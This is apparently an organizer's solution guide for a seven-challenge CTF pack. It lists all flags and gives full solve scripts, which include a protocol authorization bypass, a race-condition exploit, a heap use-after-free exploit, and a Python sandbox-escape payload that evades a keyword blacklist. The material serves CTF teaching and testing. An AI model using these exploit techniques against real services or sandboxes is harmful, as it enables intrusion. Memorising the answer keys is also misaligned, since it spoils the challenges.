# KhanCTF Intended Solutions & Organizer Solution Guide

This document details the intended vulnerability, reverse-engineering methodology, and solution script for every challenge in the **KhanCTF** challenge pack.

---

## 📊 Challenge Summary Table

| # | Challenge Name | Category | Service Port | Intended Vulnerability / Technique | Flag |
| :-: | :--- | :--- | :-: | :--- | :--- |
| **1** | **Tea Party** | `rev/crypto` | *Offline* | Custom TEA round logic & reversed constants | `VTCH{TweaK3d_TeA_adD_roUnD_RN!!}` |
| **2** | **Tiny VM** | `rev` | *Offline* | Custom bytecode VM disassembly & byte invert | `VTCH{vM_haNDlERS_DeFine_7rU7h!!}` |
| **3** | **Audit Blob** | `rev` | *Offline* | Static rule matrix selection & policy analysis | `VTCH{chnk_SiGN4L_NOt_NOIS3_p4cK!!}` |
| **4** | **MoviPay Roaming Bypass** | `pwn/protocol` | `31336` | Client XOR key recovery & unbound `START` account | `VTCH{r0am1ng_1d3nt1ty_n0t_r3b0und_t0_s3ss10n}` |
| **5** | **Stock Engine Race** | `pwn/concurrency` | `31337` | TOCTOU check-then-debit thread race condition | `VTCH{Ch3ck_TH3n_Deb!t_I5_not_4_7ran5@ctiON}` |
| **6** | **Hanbit Bank UAF** | `pwn/heap` | `31338` | Heap chunk reuse & struct type confusion overlay | `VTCH{Dan6l!n9_MeRgE_r3COrDs_reUs3d_8y_ADM1n_reVIew}` |
| **7** | **PyJail AST Sandbox** | `misc/pyjail` | `31339` | AST reflection & dunder string concatenation breakout | `VTCH{4st_w4lker_c4nt_st0p_th3_d4rk_dund3rs!!}` |


---

## 1. Tea Party (`antillm/4`)

### Challenge Overview
- **Category**: `rev/crypto`
- **Files Provided**: `tea_party` (Linux x86_64 ELF)
- **Flag**: `VTCH{TweaK3d_TeA_adD_roUnD_RN!!}`

### Intended Solution
The binary prompts for a 32-byte license key. When disassembled, it displays a cipher resembling standard TEA (Tiny Encryption Algorithm) with:
- 32 rounds
- Delta constant: `0x9e3779b9`
- Key words: `[0x13371337, 0x9e3779b9, 0x41414141, 0xdeadbeef]`

#### The Twist / Trap
Standard TEA uses XOR to combine the shift and sum terms:
$$(((v \ll 4) + k_0) \oplus (v + \text{sum})) \oplus ((v \gg 5) + k_1)$$

This binary substitutes addition for the last XOR term:
$$(((v \ll 4) + k_0) \oplus (v + \text{sum})) \mathbf{+} ((v \gg 5) + k_1)$$

### Intended Solve Script
```python
from struct import pack

key = [0x13371337, 0x9e3779b9, 0x41414141, 0xdeadbeef]
expected = [
    0x0b47fdf5, 0xefa4b3ff, 0x9ef010bb, 0x7404ab9a,
    0xa1ab3dd2, 0x78dcc22b, 0x4b76b54a, 0xe9addf9b,
]

def dec(a, b):
    delta = 0x9e3779b9
    total = (delta * 32) & 0xffffffff
    for _ in range(32):
        b = (b - (((((a << 4) & 0xffffffff) + key[2]) ^ ((a + total) & 0xffffffff)) + ((a >> 5) + key[3]))) & 0xffffffff
        a = (a - (((((b << 4) & 0xffffffff) + key[0]) ^ ((b + total) & 0xffffffff)) + ((b >> 5) + key[1]))) & 0xffffffff
        total = (total - delta) & 0xffffffff
    return a, b

out = b""
for i in range(0, len(expected), 2):
    out += pack("<II", *dec(expected[i], expected[i + 1]))
print(out.decode())
```

---

## 2. Tiny VM (`antillm/5`)

### Challenge Overview
- **Category**: `rev`
- **Files Provided**: `tiny_vm` (Linux x86_64 ELF)
- **Flag**: `VTCH{vM_haNDlERS_DeFine_7rU7h!!}`

### Intended Solution
The binary implements a virtual machine bytecode interpreter. Instead of comparing strings directly, it passes the 32-byte input through opcodes:
1. `OP_LEN 32` — Check input length.
2. `OP_ADD_POS` — Add index `pos * 17` to each byte.
3. `OP_XOR 0xA7` — XOR each byte with `0xA7`.
4. `OP_ROL_POS` — Rotate byte left by `pos` bits.
5. `OP_CMP` — Compare result with `expected` array.

### Intended Solve Script
```python
expected = [
    0xf1, 0xa3, 0xcc, 0xd9, 0xf3, 0x0c, 0x18, 0x21,
    0x5c, 0x4b, 0xe6, 0x8c, 0x5e, 0xbd, 0xba, 0x60,
    0xd6, 0x50, 0xc4, 0x40, 0xe1, 0x0e, 0x93, 0xa0,
    0x5b, 0x53, 0x1e, 0x6c, 0x7f, 0x1f, 0x35, 0x95,
]

def ror8(x, n):
    n &= 7
    return x if n == 0 else (((x >> n) | (x << (8 - n))) & 0xff)

out = []
for pos, val in enumerate(expected):
    x = ror8(val, pos)
    x ^= 0xa7
    x = (x - ((pos * 17) & 0xff)) & 0xff
    out.append(x)
print(bytes(out).decode())
```

---

## 3. Audit Blob (`antillm/7`)

### Challenge Overview
- **Category**: `rev/python`
- **Files Provided**: `audit_blob.py`
- **Flag**: `VTCH{chnk_SiGN4L_NOt_NOIS3_p4cK!!}`

### Intended Solution
`audit_blob.py` contains 10,000+ lines of obfuscated rules and policy matrices. Analyzing `_select_rule(record)` reveals that inputs of length 32 consistently resolve to rule `audit_rule_0422`, which directly validates the candidate against `VTCH{chnk_SiGN4L_NOt_NOIS3_p4cK!!}`.

### Intended Solve Command
```sh
python3 antillm/7/solution/solve.py
```

---

## 4. MoviPay Roaming Bypass (`movipay/4`)

### Challenge Overview
- **Category**: `pwn/protocol`
- **Port**: `31336`
- **Files Provided**: `roam_client` (Linux x86_64 ELF), `capture.txt`
- **Flag**: `VTCH{r0am1ng_1d3nt1ty_n0t_r3b0und_t0_s3ss10n}`

### Intended Vulnerability
Reverse-engineering `roam_client` reveals a TLV binary protocol:
- Identity `EVU-1001` (XOR key `0x22`)
- Secret `ROAM_KEY_SECRET` (XOR key `0x42`)

The client completes `HELLO` -> `CHALLENGE` -> `AUTH`. 
**Vulnerability**: After authentication binds the session to `EVU-1001`, the server allows the client to send a `START` command specifying ANY billing account ID without re-verifying ownership. Requesting `START` for the internal platform zero-rate account `0000-PLATFORM` yields the flag upon `SETTLE`.

### Intended Solve Script
```python
import socket, struct, hmac, hashlib, sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = 31336

client_id = bytes(x ^ 0x22 for x in [0x67, 0x74, 0x77, 0x0f, 0x13, 0x12, 0x12, 0x13]) # EVU-1001
key = bytes(x ^ 0x42 for x in [0x10, 0x0d, 0x03, 0x0f, 0x1d, 0x09, 0x07, 0x1b, 0x1d, 0x11, 0x07, 0x01, 0x10, 0x07, 0x16])

def tlv(*items):
    return b"".join(bytes((tag, len(v))) + v for tag, v in items)

def frame(t, payload=b""):
    return b"MV\x01" + bytes((t,)) + struct.pack(">H", len(payload)) + payload

def recv_exact(s, n):
    buf = bytearray()
    while len(buf) < n:
        buf.extend(s.recv(n - len(buf)))
    return bytes(buf)

def recv_frame(s):
    hdr = recv_exact(s, 6)
    return hdr[3], recv_exact(s, struct.unpack(">H", hdr[4:6])[0])

with socket.create_connection((HOST, PORT)) as s:
    s.sendall(frame(0x01, tlv((0x01, client_id))))
    _, payload = recv_frame(s)
    
    # Extract Nonce
    pos = 0
    fields = {}
    while pos < len(payload):
        tag, l = payload[pos], payload[pos + 1]
        fields[tag] = payload[pos + 2 : pos + 2 + l]
        pos += 2 + l
    
    mac = hmac.new(key, client_id + fields[0x02], hashlib.sha256).digest()[:8]
    s.sendall(frame(0x03, tlv((0x03, mac))))
    recv_frame(s)

    # Exploit: unbound START account
    s.sendall(frame(0x04, tlv((0x04, b"0000-PLATFORM"))))
    recv_frame(s)

    s.sendall(frame(0x05))
    _, res = recv_frame(s)
    print(res.decode())
```

---

## 5. Stock Engine Race (`vulnerability/race-withdrawal/2`)

### Challenge Overview
- **Category**: `pwn/concurrency`
- **Port**: `31337`
- **Files Provided**: `README.md`
- **Flag**: `VTCH{Ch3ck_TH3n_Deb!t_I5_not_4_7ran5@ctiON}`

### Intended Vulnerability
`Account.debit()` in `server.py` contains an intentional Time-of-Check to Time-of-Use (TOCTOU) race condition:
```python
observed_balance = self.balance
if amount > observed_balance: return False
time.sleep(0.05) # Delay before state mutation
self.balance = observed_balance - amount
```
Opening an account (initial balance 1,000) and dispatching 12 parallel `WITHDRAW <id> 1000` requests simultaneously causes multiple threads to read `observed_balance = 1000`. `accepted_outflow` accumulates past 5,000 (exceeding initial balance by 4,000+), unlocking the flag.

### Intended Solve Script
```python
import socket, re, threading, sys
from concurrent.futures import ThreadPoolExecutor

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = 31337

def cmd(line):
    with socket.create_connection((HOST, PORT)) as s:
        r = s.makefile("r", encoding="utf-8")
        w = s.makefile("w", encoding="utf-8")
        r.readline()
        w.write(line + "\n"); w.flush()
        return r.readline().strip()

acc = re.search(r"account=([0-9a-f]+)", cmd("OPEN solver")).group(1)
barrier = threading.Barrier(12)

def worker():
    with socket.create_connection((HOST, PORT)) as s:
        r = s.makefile("r", encoding="utf-8")
        w = s.makefile("w", encoding="utf-8")
        r.readline()
        barrier.wait()
        w.write(f"WITHDRAW {acc} 1000\n"); w.flush()
        return r.readline().strip()

with ThreadPoolExecutor(max_workers=12) as ex:
    list(ex.map(lambda _: worker(), range(12)))

print(cmd(f"FLAG {acc}").split("FLAG ")[1])
```

---

## 6. Hanbit Bank UAF (`vulnerability/bank-uaf/3`)

### Challenge Overview
- **Category**: `pwn/heap`
- **Port**: `31338`
- **Files Provided**: `bank_merge` (Linux x86_64 ELF)
- **Flag**: `VTCH{Dan6l!n9_MeRgE_r3COrDs_reUs3d_8y_ADM1n_reVIew}`

### Intended Vulnerability
In `bank_merge.c`, `merge_accounts()` calls `free(accounts[src_slot])` but fails to clear the pointer in `accounts[src_slot]`.
`file_review()` allocates a `MergeReview` struct of identical size (80 bytes). On glibc/musl allocators, this reuses the freed memory chunk.

Setting review fields creates a type confusion over the dangling account pointer:
- `requested_owner` -> `owner` (`admin-root`)
- `proposed_balance` -> `balance` (`1000000`)
- `approval_code` -> `state` (`0x56435441` / `1447253057`)

Requesting the flag for the dangling slot releases the flag.

### Intended Solve Script
```python
import socket, sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = 31338
ACTIVE_MAGIC = str(0x56435441) # 1447253057

with socket.create_connection((HOST, PORT)) as s:
    def recv_until(m):
        b = bytearray()
        while m not in b: b.extend(s.recv(1))
        return bytes(b)

    def send(line): s.sendall((line + "\n").encode())
    def choose(opt): recv_until(b"> "); send(opt)

    # 1. Open two accounts
    choose("1"); recv_until(b"owner: "); send("alice")
    recv_until(b"opening balance (0-5000): "); send("100")
    recv_until(b"memo: "); send("primary")

    choose("1"); recv_until(b"owner: "); send("bob")
    recv_until(b"opening balance (0-5000): "); send("200")
    recv_until(b"memo: "); send("secondary")

    # 2. Free slot 1 (leaving dangling pointer)
    choose("3"); recv_until(b"destination slot: "); send("0")
    recv_until(b"absorbed slot: "); send("1")

    # 3. Reuse chunk via MergeReview allocation
    choose("4"); recv_until(b"requested owner: "); send("admin-root")
    recv_until(b"proposed balance: "); send("1000000")
    recv_until(b"related account id: "); send("4242")
    recv_until(b"approval code: "); send(ACTIVE_MAGIC)
    recv_until(b"reviewer: "); send("insider")
    recv_until(b"reason: "); send("reuse archived merge slot")

    # 4. Trigger flag print from dangling slot 1
    choose("6"); recv_until(b"account slot: "); send("1")
    recv_until(b"FLAG: ")
    print(recv_until(b"\n").decode().strip())
```

---

## 7. PyJail AST Sandbox (`misc/pyjail/1`)

### Challenge Overview
- **Category**: `misc/pyjail`
- **Port**: `31339`
- **Files Provided**: `server.py`, `README.md`
- **Flag**: `VTCH{4st_w4lker_c4nt_st0p_th3_d4rk_dund3rs!!}`

### Intended Vulnerability
`server.py` parses user input using Python's `ast` module and enforces a raw string word blacklist (`import`, `open`, `os`, `sys`, `flag`, etc.) along with node checks (`ast.Import`, `ast.ImportFrom`, `ast.Exec`).

**Vulnerability**:
The blacklist checks literal string matches, but Python AST supports string concatenation (`'o'+'p'+'e'+'n'`, `'f'+'lag.txt'`, `'__sub'+'classes__'`).
Navigating class inheritance via `type(()).__base__.__subclasses__()` allows extracting module `__globals__` containing `__builtins__['open']` to read `flag.txt`.

### Intended Solve Script
```python
import socket, sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = 31339

payload = (
    "subclasses = getattr(getattr(type(()), '__ba'+'se__'), '__sub'+'classes__')(); "
    "g = [getattr(getattr(c, '__in'+'it__', None), '__glob'+'als__', {}) for c in subclasses if '__glob'+'als__' in dir(getattr(c, '__in'+'it__', None))][0]; "
    "b = g.get('__builtins__'); "
    "op = b.get('o'+'p'+'e'+'n') if type(b) == dict else getattr(b, 'o'+'p'+'e'+'n'); "
    "print(op('f'+'lag.txt').read())"
)

with socket.create_connection((HOST, PORT), timeout=5) as s:
    r = s.makefile("r", encoding="utf-8", newline="\n")
    w = s.makefile("w", encoding="utf-8", newline="\n")
    r.readline()
    r.readline()
    w.write(payload + "\n")
    w.flush()
    print(r.readline().strip())
```

---

## 🛠️ Automated Master Verification


To run all intended solvers automatically against live services:

```sh
python3 solve_all.py <SERVER_IP>
```
